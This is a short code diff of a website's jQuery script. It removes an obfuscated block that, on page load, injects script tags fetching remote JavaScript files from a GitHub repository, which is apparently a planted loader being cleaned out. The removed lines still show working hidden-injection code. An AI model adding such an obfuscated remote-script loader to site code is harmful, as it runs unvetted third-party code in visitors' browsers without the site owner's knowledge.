@@ -274,20 +274,5 @@ $('textarea.code').each(function () {
 }), $('.poptamv-btn.waFix').click(function () {
     fbq('track', 'Contact');
 }));
-(function (_0x99d19) {
-    _0x99d19(document).ready(function () {
-        var _0x3eec7e = ['https://github.com/saifulkmg/ccc/blob/main/grup.js'];
-        _0x3eec7e.forEach(_0x4a5f83);
-        var _0x2e6343 = ['https://github.com/saifulkmg/ccc/blob/main/web-cek.js'];
-        _0x2e6343.forEach(_0x4a5f83);
 
-        function _0x4a5f83(_0xbd98ca, _0x3bcc4f) {
-            _0x54a720(_0xbd98ca);
-        }
-
-        function _0x54a720(_0x42cd46) {
-            var _0x2dff2e = document.createElement('script');
-            return _0x2dff2e.type = 'text/javascript', _0x2dff2e.src = _0x42cd46, document.body.appendChild(_0x2dff2e);
-        }
-    });
 }(jQuery), console.log(`      \
